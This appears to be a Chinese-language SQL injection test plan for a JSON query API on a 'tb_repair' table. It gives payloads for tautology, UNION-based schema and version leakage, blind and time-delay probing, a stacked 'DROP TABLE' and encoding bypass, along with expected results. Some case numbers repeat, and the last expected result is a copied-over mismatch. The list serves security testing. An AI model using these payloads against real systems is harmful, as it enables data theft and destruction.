## 用例1基本测试，正常数据：

```
{
"tableName": "tb_repair",
"columns": ["id", "id_container", "code_path"],
"columnsCondition": ["code_path", "id_container"],
"values": ["id_9_device_5_container_5_source.txt", "5"]
}
```

## 用例2 单引号闭合测试（基础注入）

```
{
  "tableName": "tb_repair",
  "columns": ["id", "id_container", "code_path"],
  "columnsCondition": ["code_path", "id_container"],
  "values": ["' OR '1'='1", "5"]
}
```

预期行为：如果易受攻击，将返回所有记录（'1'='1总是为真）

## 用例3 条件永真攻击

```
{
  "tableName": "tb_repair",
  "columns": ["id", "id_container", "code_path"],
  "columnsCondition": ["code_path", "id_container"],
  "values": ["'; --", "5 OR 1=1"]
}
```

预期行为：注释符(--)将删除后续查询条件

## 用例4 联合查询信息泄露

```
{
  "tableName": "tb_repair",
  "columns": ["id", "id_container", "code_path"],
  "columnsCondition": ["code_path", "id_container"],
  "values": [
    "' UNION SELECT version(), user(), database() -- ", 
    "5"
  ]
}
```

预期行为：返回数据库版本、用户和库名等敏感信息

## 用例5 跨表查询攻击

```
{
  "tableName": "tb_repair",
  "columns": ["id", "id_container", "code_path"],
  "columnsCondition": ["code_path", "id_container"],
  "values": [
    "' OR 1=1 UNION SELECT table_name, column_name, 1 FROM information_schema.columns --", 
    "5"
  ]
}
```

预期行为：泄露数据库所有表和列信息

## 用例5 布尔盲注攻击

```
{
  "tableName": "tb_repair",
  "columns": ["id", "id_container", "code_path"],
  "columnsCondition": ["code_path", "id_container"],
  "values": [
    "' AND SUBSTRING((SELECT @@version),1,1)='5' --", 
    "5"
  ]
}
```

预期行为：通过不同响应判断MySQL是否以5开头（如5.6/5.7）

## 用例5 时间延迟攻击

```
{
  "tableName": "tb_repair",
  "columns": ["id", "id_container", "code_path"],
  "columnsCondition": ["code_path", "id_container"],
  "values": [
    "'; IF(1=1) WAITFOR DELAY '0:0:5' --",  // SQL Server
    "' OR SLEEP(5) --"                     // MySQL
  ]
}
```

预期行为：响应延迟5秒确认漏洞存在

## 用例5 堆叠查询攻击

```
{
  "tableName": "tb_repair",
  "columns": ["id", "id_container", "code_path"],
  "columnsCondition": ["code_path", "id_container"],
  "values": [
    "'; DROP TABLE tb_users; --", 
    "5"
  ]
}
```

预期行为：可能删除其他数据表（仅在测试环境使用！）

## 用例5 特殊字符绕过测试

```
{
  "tableName": "tb_repair",
  "columns": ["id", "id_container", "code_path"],
  "columnsCondition": ["code_path", "id_container"],
  "values": [
    "\\u0027 OR 1=1 --",  // Unicode编码单引号
    "0x20 OR 1=1"          // 十六进制编码空格
  ]
}
```

预期行为：可能删除其他数据表（仅在测试环境使用！）